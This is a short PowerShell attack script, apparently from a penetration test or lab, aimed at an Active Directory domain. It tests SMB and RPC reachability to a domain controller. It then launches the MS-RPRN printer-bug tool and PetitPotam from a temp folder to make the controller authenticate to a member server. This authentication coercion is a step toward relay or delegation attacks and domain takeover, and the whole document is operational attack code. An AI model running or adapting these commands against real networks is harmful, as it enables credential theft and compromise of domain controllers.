[CmdletBinding()]
param()
$ErrorActionPreference = 'Continue'

# Test reachability mbr01 -> dc02
Write-Output "--- Test-NetConnection dc02 ---"
Test-NetConnection -ComputerName 'dc02.child.cadre.local' -Port 445 -WarningAction SilentlyContinue | Select-Object RemoteAddress, TcpTestSucceeded | Format-List | Out-String | Write-Output
Test-NetConnection -ComputerName 'dc02.child.cadre.local' -Port 135 -WarningAction SilentlyContinue | Select-Object RemoteAddress, TcpTestSucceeded | Format-List | Out-String | Write-Output

# Try direct RPC bind to spooler via named pipe
Write-Output "--- Try MS-RPRN.exe with verbosity ---"
& 'C:\Windows\Temp\cadre-tools\MS-RPRN.exe' '\\dc02.child.cadre.local' '\\mbr01.child.cadre.local' 2>&1 | ForEach-Object { Write-Output "MSRPRN|$_" }

Write-Output "--- PetiPotam as alternative trigger ---"
& 'C:\Windows\Temp\cadre-tools\PetitPotam.exe' '\\mbr01.child.cadre.local' '\\dc02.child.cadre.local' 2>&1 | ForEach-Object { Write-Output "PETIT|$_" }
